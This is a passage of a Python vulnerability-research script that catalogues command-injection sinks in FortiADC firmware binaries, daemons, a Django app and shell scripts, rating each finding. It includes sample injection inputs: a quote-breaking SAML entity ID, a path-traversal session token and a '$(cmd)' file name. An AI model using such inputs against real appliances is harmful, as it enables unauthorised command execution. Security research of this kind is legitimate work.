            "ssrf_note": "url JSON field allows admin-configured ACME server URL (SSRF if non-admin can set it; admin-only CMDB path expected)",
            "eab_creds": "eab_kid/eab_mac_key in JSON config — External Account Binding credentials (FortiGuard service account linkage)",
        },
    },

    "LOGDAEMONS_profile": {
        "binary": "flg_accessd/flg_indexd/flg_reportd/lb/infod/rd_mng",
        "status": "ANALYZED COMPLETE — all ELIMINATED; flg_reportd execve = hardcoded /bin/email (SMTP reporter)",
        "evidence": {
            "fadcsystem_posixspawnp": "All fadcsystem callers use posix_spawnp (libstdext.so confirmed) — shell injection ELIMINATED",
            "rd_mng": "No exec-class sinks. CLEAN.",
            "flg_reportd_execve_ELIMINATED": (
                "execve at 0x1512e — fork+pipe+execve helper at 0x15000. Single caller at 0xaf31. "
                "path = hardcoded '/bin/email'. argv = hardcoded ['/bin/email', '-V', '--no-encoding', "
                "'--conf-file', '--from-name', '--from-addr', '--smtp-server', '--smtp-port', '-m', "
                "'login', '--smtp-user', '--smtp-pass', '-tls', '--subject', 'FortiADC Report', '-a']. "
                "Args filled from admin SMTP configuration. execve not shell. ELIMINATED."
            ),
            "lb_fadcpopen": "fadcpopen = fork+pipe+exec pattern (no shell per libstdext.so analysis). ELIMINATED.",
        },
    },

    "OCGS_profile": {
        "binary": "ocgs",
        "status": "ANALYZED — CLEAN (no exploitable path found)",
        "evidence": {
            "socket_type": "unixgram (Unix domain datagram) — local IPC only, no network exposure",
            "protocol_cmds": "reset(5), Disconnected(12), nolicense(9), Connected(9), snupdate(8+), memb...",
            "auth_endpoint": "/api/fabric/auth + /api/v1.0/one-click-glb-server (Fabric API)",
            "tls": "standard crypto/tls, no InsecureSkipVerify found",
            "plt_sinks": "no system/execv/sprintf/strcpy; only libc pthread/privilege/dns imports",
            "auth_url_ssrf": "THEORETICAL — auth_url admin-configurable; no exploitation evidence",
        },
    },

    # ── Routing Daemons: bgpd / ospfd / ospf6d / keepalived / av ─────────────────
    # All five daemons share a log rotation pattern via system():
    #   snprintf(buf, 'cp /tmp/%s_<daemon>.log /tmp/%s_<daemon>_old.log', vdom_name, vdom_name)
    #   system(buf)
    # %s = VDOM name. If CMDB VDOM name validation allows shell metacharacters → injection.
    # Same class as FAD_M1 (miglogd). Log rotation callers: PLAUSIBLE MEDIUM.
    #
    # bgpd: 236 system() callers. 4 log rotation format variants + 4 hardcoded access_list strings (ELIMINATED).
    # ospfd: 101 system() callers. 1 format: cp /tmp/%s_ospfd.log … (log rotation only).
    # ospf6d: 65 system() (log rotation) + 2 sys_vdom_exec (FAD_O1 IPsec state mgmt).
    # keepalived: 79 fadcsystem (posix_spawnp; pending) + sys_vdom_exec ELIMINATED + execle /bin/bash PLAUSIBLE LOW.
    # av: 3 fadcsystem (diagnostic collect; PLAUSIBLE LOW) + 2 fork (no exec in child; ELIMINATED).

    "BGP_profile": {
        "binary": "bgpd",
        "status": "ANALYZED — PLAUSIBLE MEDIUM (log rotation system() x4 + VDOM name); access_list strings ELIMINATED",
        "evidence": {
            "system_236": "236 system() callers via __snprintf_chk → system(). snprintf + stack buf + system pattern.",
            "log_rotation_fmts": (
                "'cp /tmp/%s_bgpd.log /tmp/%s_bgpd_old.log' (0x11efb8), "
                "'cp /tmp/%s_cmd_bgp.log /tmp/%s_cmd_bgp_old.log' (0x121f28), "
                "'cp /tmp/%s_fillist.log /tmp/%s_fillist_old.log' (0x143268), "
                "'cp /tmp/%s_prelist.log /tmp/%s_prelist_old.log' (0x1493d0). "
                "%s = VDOM name. PLAUSIBLE MEDIUM if VDOM name allows shell metacharacters (same class as FAD_M1)."
            ),
            "access_list_ELIMINATED": (
                "'add_access_list_rule', 'del_access_list_rule', 'add_access_list6_rule', 'del_access_list6_rule' "
                "(0x14da90/b0/db50/db70). No %s — hardcoded command strings. ELIMINATED."
            ),
            "system_plt": "0x28b60",
        },
    },

    "OSPF_profile": {
        "binary": "ospfd",
        "status": "ANALYZED — PLAUSIBLE MEDIUM (log rotation system() x1 variant + VDOM name)",
        "evidence": {
            "system_101": "101 callers. Single format: 'cp /tmp/%s_ospfd.log /tmp/%s_ospfd_old.log' (0xabcc8).",
            "vdom_injection": "%s = VDOM name. PLAUSIBLE MEDIUM — same class as FAD_M1 and bgpd.",
            "system_plt": "0x179e0",
        },
    },

    "OSPF6_profile": {
        "binary": "ospf6d",
        "status": "ANALYZED — FAD_O1 PLAUSIBLE LOW-MEDIUM (sys_vdom_exec IPsec); log rotation PLAUSIBLE MEDIUM",
        "evidence": {
            "sys_vdom_exec_2": (
                "2 callers (0x3fe90, 0x40257). Format: 'ip -6 xfrm state %s dst %s proto %s spi %s'. "
                "Args: state=('ah'/'add' from routing flag), dst/proto/spi from routing table struct. "
                "Not direct user input — routing data. PLAUSIBLE LOW-MEDIUM (FAD_O1)."
            ),
            "enc_snprintf_fragment": (
                "' enc %s 0x%s' (0x8de37) — snprintf fragment appending IPsec cipher/key to command buffer. "
                "Not a direct system() call — feeds into sys_vdom_exec command assembly."
            ),
            "system_65": (
                "65 system() callers. Format: 'cp /tmp/%s_ospf6d.log /tmp/%s_ospf6d_old.log' (0x78568). "
                "Log rotation with VDOM name — PLAUSIBLE MEDIUM (same class as FAD_M1)."
            ),
            "false_positive_note": "'enc %s 0x%s' is in a snprintf block that jmps away before system() — not a system() arg.",
            "sys_vdom_exec_plt": "0xf420",
            "system_plt": "0xf990",
        },
    },

    "KEEPALIVED_profile": {
        "binary": "keepalived",
        "status": "ANALYZED COMPLETE — PLAUSIBLE LOW (execle /bin/bash VRRP script only; fadcsystem ALL ELIMINATED)",
        "evidence": {
            "sys_vdom_exec_0x54f76_ELIMINATED": (
                "'echo %d > /proc/sys/net/ipv4/route/proximity_mode' — integer arg (%d), hardcoded path. ELIMINATED."
            ),
            "execle_0x38659_PLAUSIBLE_LOW": (
                "execle('/bin/bash', ...) — VRRP health check script. Admin-configured path. "
                "By-design: VRRP health checks run admin scripts. PLAUSIBLE LOW."
            ),
            "fadcsystem_79_ALL_ELIMINATED": (
                "79 callers all ELIMINATED. 75x hardcoded HC chroot setup: "
                "'mkdir -p /tmp_hc_root/{bin,dev,usr,...}', 'cp -f /lib/*.so /tmp_hc_root/lib', "
                "'cp -rf /bin/_hc_root_busybox/bin/.', 'find /tmp/failed_llbr_hc -mindepth 1 -delete', "
                "'killall -9 oracle_client', 'rm -rf /bin/_hc_root_busybox'. "
                "2 snprintf-then-fadcsystem callers: 'mkdir -p %s/tmp_hc_root' + 'chmod +x %s' — "
                "HC config-derived paths (admin-configured health check scripts), posix_spawn not shell. "
                "No %s from network-injectable source. ALL ELIMINATED."
            ),
            "sys_vdom_exec_plt": "0x9860",
            "execle_plt": "0x9f70",
            "fadcsystem_plt": "0x9b00",
        },
    },

    "AV_BIN_profile": {
        "binary": "av",
        "status": "ANALYZED — fadcsystem PLAUSIBLE LOW (diagnostic collect; daemon-internal path); fork ELIMINATED",
        "evidence": {
            "fadcsystem_3": (
                "'cat /proc/meminfo >> %s' (0x4a205), 'df -ha >> %s' (0x4a21d), 'du -ha /tmp_av/ >> %s' (0x4a22a). "
                "%s = daemon-internal log file path (scanuint_debug_mem_printf context). "
                "fadcsystem = parse_command_line + execute_command (not shell). >> handled by posix_spawn file actions. "
                "PLAUSIBLE LOW — path traversal only; path is daemon-internal state, not user input."
            ),
            "fork_2_ELIMINATED": (
                "fork() at 0x11eeb and 0x12210. Both children call internal worker function 0x15cb0. "
                "No execve/execl/posix_spawn in child path. ELIMINATED."
            ),
            "fadcsystem_plt": "0x8900",
            "fork_plt": "0x8db0",
        },
    },

    # ── opensips (2.5MB C PIE, SIP proxy) ─────────────────────────────────────────
    # PLT exec sinks: fork@plt (0x188c0) only. No system/execv/fadcsystem/sys_vdom_exec.
    # 3 fork callers: 0x36e40, 0x36e76, 0x707fc.
    # 0x36e40 context: string 'WARNING:core:%s: pgid file %s exists...' — process management fork.
    # Standard OpenSIPS multi-process architecture: child processes per SIP module.
    # CLEAN for command injection.

    "OPENSIPS_profile": {
        "binary": "opensips",
        "status": "ANALYZED — CLEAN; no exec sinks; fork = SIP worker process management",
        "evidence": {
            "plt_CLEAN": "No system/execv/fadcsystem/sys_vdom_exec in PLT. fork only.",
            "fork_3": "0x36e40 (pgid/process management), 0x36e76, 0x707fc — standard SIP multi-process worker architecture. ELIMINATED.",
        },
    },

    # ── httproxy3 (3.9MB C PIE, HTTP/3 proxy + HAProxy engine) ──────────────────
    # PLT sinks: sys_vdom_exec(0x63ff0, 6 callers), fadcsystem_envp(0x64a80, 1), fork(0x65030, 4), execvp(0x650d0, 3).
    # HAProxy embedded: HAPROXY_MWORKER_REEXEC/WAIT_ONLY env vars, execvp = HAProxy master worker re-exec.
    #
    # sys_vdom_exec callers:
    #   FAD_H1 (0x2b9563, merge_fngx_session_table): 'cat /etc/fnginx_new/%s/sessions/* >> %s 2>/dev/null'
    #     %s = VS name (first arg), output file (second arg). VS name → shell via sys_vdom_exec. PLAUSIBLE MEDIUM.
    #   FAD_H2 (0x2b9459, merge_httproxy_vs_session_table): 'cat %s >> %s' where first %s is built from
    #     '/var/log/vs/%s/%s.%d.sess' (VDOM+VS name). stat() gate: file must exist first. PLAUSIBLE LOW-MEDIUM.
    #   0x2b9a45/0x2bac0d/0x2bb9c5/0x2bc735 (filter_sessions_table): 'cat <hardcoded_proc_file> >> %s'
    #     Source = /proc/net/ip_vs_{session,persist}[_gui] — hardcoded. Output to r13 stack buf. PLAUSIBLE LOW.
    #
    # execvp callers (3): HAProxy re-exec via uwsgi_binsh() / uwsgi self-restart — ELIMINATED.
    # fadcsystem_envp (1, 0x2bf5a1 fadc_clear_session_start): '/bin/sh %s' where %s = mkstemp path.
    #   Template: '/tmp/hap_fadcsystem/stat_sess_persis_fadcsystem_shXXXXXX' (hardcoded, mkstemp). ELIMINATED.
    # fork (4): worker patterns — pending analysis.

    "HTTPROXY3_profile": {
        "binary": "httproxy3",
        "status": "ANALYZED — FAD_H1 PLAUSIBLE MEDIUM (VS name → sys_vdom_exec); FAD_H2 PLAUSIBLE LOW-MEDIUM; HAProxy re-exec ELIMINATED",
        "evidence": {
            "fad_h1_0x2b9563": (
                "merge_fngx_session_table: snprintf(r8='cat /etc/fnginx_new/%s/sessions/* >> %s 2>/dev/null', "
                "r9=VS_name, stack=outfile) → sys_vdom_exec(rdi, cmd). "
                "First %s = VS name from CMDB (admin-set). Shell injection if VS name allows metacharacters. "
                "PLAUSIBLE MEDIUM — same class as FAD_N1 (fnginxctld)."
            ),
            "fad_h2_0x2b9459": (
                "merge_httproxy_vs_session_table: builds '/var/log/vs/%s/%s.%d.sess' (VDOM+VS+idx), "
                "stat() check, then 'cat <session_path> >> <outfile>' via sys_vdom_exec. "
                "stat() gate: session file must exist to trigger. PLAUSIBLE LOW-MEDIUM."
            ),
            "filter_sessions_table_4": (
                "0x2b9a45/0x2bac0d/0x2bb9c5/0x2bc735: 'cat /proc/net/ip_vs_{session,persist}[_gui] >> %s'. "
                "Source = hardcoded kernel /proc paths. Output = r13 stack buffer (origin pending trace). PLAUSIBLE LOW."
            ),
            "execvp_3_ELIMINATED": (
                "0x20593c/0x2a563f: HAProxy master worker re-exec via HAPROXY_MWORKER_REEXEC/WAIT_ONLY env. "
                "execvp(argv[0], same_argv) — self-re-exec for graceful restart. ELIMINATED."
            ),
            "fadcsystem_envp_0x2bf5a1_ELIMINATED": (
                "fadc_clear_session_start: '/bin/sh <mkstemp_tempfile>'. "
                "Template '/tmp/hap_fadcsystem/stat_sess_persis_fadcsystem_shXXXXXX' — hardcoded + mkstemp. "
                "Script content written from daemon constants. ELIMINATED for network injection."
            ),
            "sys_vdom_exec_plt": "0x63ff0",
            "fadcsystem_envp_plt": "0x64a80",
        },
    },

    # ── uwsgi (1.3MB C PIE, WSGI server) ─────────────────────────────────────────
    # PLT sinks: fork@plt (0x3f310, 12 callers), execvp@plt (0x3fbb0, 14 callers).
    # execvp callers: uwsgi_binsh() returns own binary path + '-c' config arg → self re-exec. ELIMINATED.
    # fork callers (12): standard uwsgi multi-worker process management. ELIMINATED.
    # CLEAN for command injection.

    "UWSGI_profile": {
        "binary": "uwsgi",
        "status": "ANALYZED — CLEAN; execvp = uwsgi self-re-exec (graceful restart); fork = worker management",
        "evidence": {
            "execvp_14_ELIMINATED": (
                "execvp(uwsgi_binsh(), [bin, config, '-c', NULL]) — uwsgi master worker graceful restart. "
                "execvp with own binary and own config. ELIMINATED."
            ),
            "fork_12_ELIMINATED": "Standard uwsgi multi-worker process fork. No exec in child paths traced. ELIMINATED.",
        },
    },

    # ── Small Utilities (14K binaries) ────────────────────────────────────────────
    # ditest, encrypt_file, fipstestd, geolookup, infod_shm_mng, inittest,
    # kdbgd, krb_test, send2lb — all ~14K PIE ELFs with NO exec-class PLT entries.
    # CLEAN for command injection.
    #
    # del_netdev (14624B): system@plt (0x1180, 1 caller).
    #   Format: '/bin/ls %s > /tmp/tmp.brg.list' — lists bridge dir; %s = bridge name from CLI arg.
    #   Called as: del_netdev <bridge_name>; bridge name comes from CMDB-driven config scripts.
    #   system() with shell: if bridge name allows metacharacters → injection. PLAUSIBLE LOW-MEDIUM.
    #   Context: checks /sys/class/net/, /proc/net/vlan/config — bridge/VLAN device deletion util.
    #
    # vdom (14560B): sys_vdom_exec_safe@plt (0x1080, 1 caller at 0x1373).
    #   Format: '%s ' loop appending CLI args (r15 = argv[3..argc-1]) → cmd string → sys_vdom_exec_safe.
    #   sys_vdom_exec_safe = validated variant of sys_vdom_exec (unknown sanitization).
    #   PLAUSIBLE LOW: requires authenticated admin CLI access to inject.
    #
    # rtmd (785KB): Route Table Manager Daemon. sys_vdom_exec@plt (0x11530, 8 callers).
    #   Manages Linux bridge lifecycle + interface management in VDOM context.

    "SMALL_UTILS_profile": {
        "binary": "del_netdev/ditest/encrypt_file/fipstestd/geolookup/infod_shm_mng/inittest/kdbgd/krb_test/send2lb/vdom",
        "status": "ANALYZED — 9 utils CLEAN; del_netdev PLAUSIBLE LOW-MEDIUM; vdom PLAUSIBLE LOW",
        "evidence": {
            "clean_9": "ditest/encrypt_file/fipstestd/geolookup/infod_shm_mng/inittest/kdbgd/krb_test/send2lb — no exec PLT. CLEAN.",
            "del_netdev_system": (
                "system@plt (0x1180), 1 caller (0x1998). Format: '/bin/ls %s > /tmp/tmp.brg.list'. "
                "%s = bridge name from CLI arg (CMDB-driven). Shell: '>' redirection confirms. PLAUSIBLE LOW-MEDIUM."
            ),
            "vdom_sys_vdom_exec_safe": (
                "sys_vdom_exec_safe@plt (0x1080), 1 caller (0x1373). Loop: snprintf('%s ', argv[3..n]) → cmd buf → sys_vdom_exec_safe. "
                "Validated variant of sys_vdom_exec. PLAUSIBLE LOW (admin CLI access required)."
            ),
        },
    },

    # ── rtmd (785KB C PIE, Route Table Manager Daemon) ──────────────────────────
    # Manages Linux bridge and interface lifecycle in VDOM context via sys_vdom_exec.
    # PLT: sys_vdom_exec@plt (0x11530, 8 callers). No other exec sinks.
    # Shared libs: libfmladminauth.so, libbase.so, libadc_nl_ipc.so, libfgtutil.so, etc.
    #
    # sys_vdom_exec callers (8):
    #   0x17cf5, 0x1a363: 'brctl addbr %s' — add bridge (2 call sites)
    #   0x17eb6, 0x1a524: 'ifconfig %s up' — bring interface up (2 call sites)
    #   0x18972, 0x1b876: 'ifconfig %s down' — bring interface down (2 call sites)
    #   0x18b2f, 0x1ba37: 'brctl delbr %s' — delete bridge (2 call sites)
    # %s = bridge/interface name from CMDB (admin-configured VS/network interface).
    # Same class as FAD_N1 (fnginxctld VS iface) — PLAUSIBLE MEDIUM (FAD_RT1).
    # stat() gate at 0x17cd5: checks rtmd log file size before exec (not a security gate — just log rotation check).

    "RTMD_profile": {
        "binary": "rtmd",
        "status": "ANALYZED — FAD_RT1 PLAUSIBLE MEDIUM (brctl/ifconfig + bridge name → sys_vdom_exec, same class as FAD_N1)",
        "evidence": {
            "fad_rt1_brctl": (
                "'brctl addbr %s' (0x7b412, callers 0x17cf5/0x1a363) — add Linux bridge. "
                "'brctl delbr %s' (0x7b472, callers 0x18b2f/0x1ba37) — delete Linux bridge. "
                "%s = bridge name from CMDB virtual network config. sys_vdom_exec = shell. PLAUSIBLE MEDIUM."
            ),
            "fad_rt1_ifconfig": (
                "'ifconfig %s up' (0x7b447, callers 0x17eb6/0x1a524) and 'ifconfig %s down' (0x7b461, callers 0x18972/0x1b876). "
                "%s = interface name. sys_vdom_exec = shell. PLAUSIBLE MEDIUM (same class as FAD_N1)."
            ),
            "stat_check_note": "stat() + file-size check at each caller: log file size check, not a security gate.",
            "sys_vdom_exec_plt": "0x11530",
        },
    },

    # ── Shared Libraries (all ~14KB stub wrappers unless noted) ──────────────────
    # libadc_nl_ipc.so, libautolearn.so, libbasepp.so, libcfg_saml.so, libcmdbapi.so,
    # libfmaildbapi.so, libfmlrnd.so, libfpoll.so, libfts.so, libgeo.so, libgzip.so,
    # libippool.so, librs_profile.so, libshmkvdbapi.so, libsslhw.so, libssli.so, libxpl.so.1 — CLEAN.
    #
    # libntp.so (14K): fadcsystem@plt. One caller: time_update_event_to_ntpd (0x1270).
    #   Tail-call: fadcsystem("pkill -SIGUSR1 /bin/ntpd") — hardcoded, ELIMINATED.
    # libshmkvdbapi.so (14K): system_fgt_log@plt — syslog API only, not a shell. ELIMINATED.

    "SHARED_LIBS_profile": {
        "binary": "libadc_nl_ipc/libautolearn/libbasepp/libcfg_saml/libcmdbapi/libfmaildbapi/libfmlrnd/libfpoll/libfts/libgeo/libgzip/libippool/libntp/librs_profile/libshmkvdbapi/libsslhw/libssli/libxpl.so.1",
        "status": "ANALYZED — all CLEAN; libntp fadcsystem ELIMINATED (hardcoded pkill ntpd); libshmkvdbapi system_fgt_log = syslog API",
        "evidence": {
            "clean_16": "libadc_nl_ipc, libautolearn, libbasepp, libcfg_saml, libcmdbapi, libfmaildbapi, libfmlrnd, libfpoll, libfts, libgeo, libgzip, libippool, librs_profile, libsslhw, libssli, libxpl.so.1 — no exec PLT. CLEAN.",
            "libntp_fadcsystem_ELIMINATED": "time_update_event_to_ntpd: fadcsystem('pkill -SIGUSR1 /bin/ntpd') — hardcoded. ELIMINATED.",
            "libshmkvdbapi_ELIMINATED": "system_fgt_log = syslog(3) API wrapper. Not shell execution. ELIMINATED.",
        },
    },

    "KERNEL_MODULES_profile": {
        "binary": "modules/*.ko",
        "status": "ANALYZED — all CLEAN for userspace exec; kernel-only code paths only",
        "evidence": {
            "custom_fortiadc_modules": (
                "ha.ko, vtb.ko, adc_nl_ipc_k.ko, arpfilter.ko, bridge_mac.ko, "
                "fs_miglog.ko, infodmem.ko, log_cfg.ko, miglog.ko, nmi.ko, ti_bridge.ko — "
                "FortiADC-specific kernel modules. No call_usermodehelper found. "
                "ha.ko has ha_exec_cmd symbol — kernel-internal only, no userspace spawn."
            ),
            "kvm_hypervisor_modules": (
                "kvm.ko, kvm-intel.ko, kvm-amd.ko, irqbypass.ko — stock KVM modules "
                "bundled with the KVM appliance image. No custom code paths."
            ),
            "xen_modules": (
                "xen-acpi-processor.ko, xen-gntalloc.ko, xen-gntdev.ko, xen-pciback.ko — "
                "Xen paravirt modules, bundled for multi-hypervisor support. CLEAN."
            ),
            "platform_modules": "uio.ko, wdt-nuvoton.ko — standard kernel modules. CLEAN.",
            "attack_surface": (
                "Kernel modules expose no call_usermodehelper, no request_module, "
                "no kernel_execve. No kernel-to-userspace exec primitive identified. "
                "HA/VTB/IPC functionality is kernel-internal only."
            ),
        },
    },

    "FORTIAI_profile": {
        "binary": "migadmin/fortiai/ (Django app)",
        "status": "ANALYZED — CLEAN for RCE; no exec/system/subprocess in web-facing code; session key path traversal POST-AUTH only",
        "evidence": {
            "architecture": (
                "Django 5.1.6 app served via uwsgi. Custom file-based session management "
                "in /var/log/fortiai/custom_sessions/. Talks to FortiAI cloud at "
                "fortiai.forticloud.com via TLS with client cert auth."
            ),
            "views_exec_scan": (
                "views.py (58.7KB): no os.system/exec/subprocess. All external calls via "
                "send_ai_request() → requests.post to fortiai.forticloud.com (HTTPS) or "
                "requests.get to https://127.0.0.1/api/ (local REST API). CLEAN."
            ),
            "text2lua_CLEAN": (
                "text2lua.py: Text2lua class loads LLM prompt template from disk and sends "
                "user query to /ai/v1/completions. Returns LLM-generated Lua script as "
                "streaming response to frontend — does NOT execute Lua server-side. CLEAN."
            ),
            "analysis_agent_CLEAN": (
                "agents/analysis_agent.py: AnalysisAgent._fetch_vs_metrics calls "
                "https://127.0.0.1/api/status_history/vs with requests.get(params={...}) — "
                "URL-encoded params, no injection. validate_vs_name checks vs_name against "
                "local /api/all_vs_info/vs_list_filter allowlist before use. CLEAN."
            ),
            "trend_agent_CLEAN": (
                "agents/trend_agent.py: 772 lines of pure statistical analysis "
                "(Mann-Kendall, linear regression) + LLMAgent calls. No exec. CLEAN."
            ),
            "llm_agent_CLEAN": (
                "agents/llm_agent.py: LLMAgent.execute_tool dispatches only to registered "
                "tools dict — attacker-controlled tool_name returns 'Tool not found' if not "
                "in self.tools. No dynamic code execution from LLM responses. CLEAN."
            ),
            "fortiai_diag_CLEAN": (
                "fortiai_diag.py: CLI-only diagnostic. subprocess.run(['pkill', '-15', '-f', "
                "'uwsgi.*uwsgi.ini']) — list form, no shell=True. Not web-facing. CLEAN."
            ),
            "query_docs_crash": (
                "query_docs_from_fortiai (views.py:732): @csrf_exempt only — missing "
                "@require_session. Line 736 accesses request.custom_session which is never "
                "set without the decorator. Any unauthenticated request → AttributeError → "
                "500. Not an auth bypass — crashes before any auth logic runs."
            ),
            "session_path_traversal": (
                "custom_sessions.py:create_session (line 46): session_file = "
                "os.path.join('/var/log/fortiai/custom_sessions/', f'{session_key}.json') "
                "where session_key = Authorization header token (parts[1]). No sanitization. "
                "Token '../../../../tmp/evil' → writes to /tmp/evil.json. "
                "POST-AUTH ONLY: requires successful FortiAI cloud login with appliance cert "
                "BEFORE create_session is called. Attacker must already have device access. "
                "STATUS: POST-AUTH PATH TRAVERSAL — write-primitive to *.json, no RCE."
            ),
            "settings_notes": (
                "ALLOWED_HOSTS=['*'] — accepts any host header. "
                "DEBUG=False (production). SECRET_KEY generated per-instance via secrets.choice. "
                "Database: SQLite3 (local file). No hardcoded credentials."
            ),
        },
    },

    # ── Shell scripts in /bin/ (25 .sh files) ────────────────────────────────────
    # All called from CMDB/admin operations via fadcsystem or sys_vdom_exec.
    # Args come from admin-configured CMDB values (file paths, VS names, IP:ports, SAML entities).
    # Scope: path traversal via unquoted vars in file ops, unescaped sed substitutions.

    "SHELL_SCRIPTS_profile": {
        "binary": "/bin/*.sh (25 scripts)",
        "status": "ANALYZED COMPLETE — all admin-only; FAD_S1 PLAUSIBLE MEDIUM (saml_sp_metadata.sh sed injection); misc PLAUSIBLE LOW",
        "evidence": {
            "upgrade_eval_LOW": (
                "upgrade-config-from3.x.sh line 20: eval $exp where exp = grep output from "
                "/migadmin/etc/cli_syntax.xml (firmware file, format 'gid=\"123\" range=\"val\"'). "
                "Evaluates to variable assignment only. Source is trusted firmware XML. PLAUSIBLE LOW "
                "(if /migadmin/etc/ can be written by a previous vulnerability)."
            ),
            "upgrade_sh_eval_LOW": (
                "upgrade.sh lines 24/37: cmd='stat -c %Y $var'; eval $cmd. "
                "$var = filename from ls *synflood*/*ddos* in /var/log/logrpt. "
                "If attacker can create file named '$(cmd)' in /var/log/logrpt → cmd injection. "
                "Requires write access to /var/log/logrpt (admin/root). PLAUSIBLE LOW."
            ),
            "fad_s1_saml_sp_metadata": (
                "saml_sp_metadata.sh: ENTITY_ID/SP_ROOT_URL/SERVICE_URL/LOGOFF_PATH/ACS_PATH "
                "passed as args from admin-configured SAML SP CMDB entry. "
                "Used in: sed \"s/%%entity_id%%/$ENTITY_ID/g\" — $ENTITY_ID unescaped for '\"'. "
                "If CMDB allows '\"' in SAML entity IDs/URLs: ENTITY_ID='x\"; id; echo \"' "
                "→ splits the double-quoted sed command → shell injection. "
                "Admin-only. PLAUSIBLE MEDIUM — depends on CMDB validator rejecting '\"' in URL fields. "
                "Note: '/' IS escaped to '\\/' via prior sed but '\"' is NOT escaped."
            ),
            "scripting_convert_LOW": (
                "scripting_convert.sh / stream_scripting_convert.sh: $1 = script file path "
                "(admin scripting config). Used as filename in file ops (awk/grep pipelines reading file). "
                "PLAUSIBLE LOW — path traversal in script file path."
            ),
            "vs_rs_status_LOW": (
                "vs_rs_status.sh: $2-$5 = VS/RS IP:port from CMDB. Filtered through "
                "sed 's/[][]/./g' but used unquoted in grep patterns: grep '...$VS_IP_PORT...'. "
                "Regex injection if brackets/special regex chars pass sed filter. PLAUSIBLE LOW."
            ),
            "ngx_init_lua_gen_LOW": (
                "ngx_init_lua_file_gen.sh: $2 = VS name in sed -i pattern. "
                "If VS name contains '/' or regex metacharacters → sed pattern injection. "
                "PLAUSIBLE LOW (VS names from admin CMDB, typically alphanumeric)."
            ),
            "scripting_priority_ELIMINATED": (
                "scripting_priority_extract.sh: $1 file path as cat $SCRIPT. "
                "All processing via grep/awk pipeline on file content. PLAUSIBLE LOW (path only)."
            ),
            "remaining_20_LOW": (
                "All other scripts (saml, routing_check, l2_vs_rs_status, backup_before_reboot, "
                "icmp_redirect, iommu, quota_check, show_ipv4/ipv6_routing_table, sslhw_init, "
                "stream_scripting_cr_check/priority/rs_check, zip_core, ngx_balancer/read_lua_file_gen): "
                "Admin-only, unquoted vars as file/IP/interface paths only. PLAUSIBLE LOW or ELIMINATED."
            ),
        },
    },
}

registry = FindingRegistry()


def run_sweep(top_n: int = 15) -> dict:
    """Run semantic sweep on httproxy. Returns {profile_name: [(score, va, desc), ...]}."""
    searcher = SemanticSearcher(HTTPROXY, plt=PLT)
    results = {}
    for name, query in VULN_PROFILES:
        hits = searcher.search(query, top_n=top_n)
        results[name] = hits
        print(f"\n[{name}] top {min(top_n, len(hits))}:")
        for score, va, desc in hits[:5]:
            print(f"  {score:.3f}  0x{va:x}  {desc[:80]}")
    return results


def disasm(va: int, binary: str = HTTPROXY, n_bytes: int = 256) -> str:
    """Disassemble n_bytes at va from binary."""
    data = Path(binary).read_bytes()
    # Find load offset: first PT_LOAD p_vaddr for PIE
    # httproxy is PIE - sections start at 0, no base adjustment needed for objdump VAs
    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    md.detail = True
    chunk = data[va: va + n_bytes]
    lines = []
    for ins in md.disasm(chunk, va):
        lines.append(f"  0x{ins.address:x}: {ins.mnemonic:<8} {ins.op_str}")
    return "\n".join(lines)


def xref(va: int, binary: str = HTTPROXY) -> list:
    """Return callers of va."""
    g = XRefGraph(binary)
    return g.callers(va)


def print_findings():
    for fid, f in FINDINGS.items():
        status = f.get("status", "UNKNOWN")
        desc = f.get("description", "")[:100]
        print(f"  {fid} [{status}]: {desc}")


if __name__ == "__main__":
    print("FortiADC httproxy sweep")
    print(f"Binary: {HTTPROXY}")
    print("Running all VULN_PROFILES...\n")
    results = run_sweep(top_n=10)
    print("\n\nSweep complete. Candidates:")
    for profile, hits in results.items():
        if hits:
            best = hits[0]
            print(f"  {profile}: best=0x{best[1]:x} score={best[0]:.3f}")
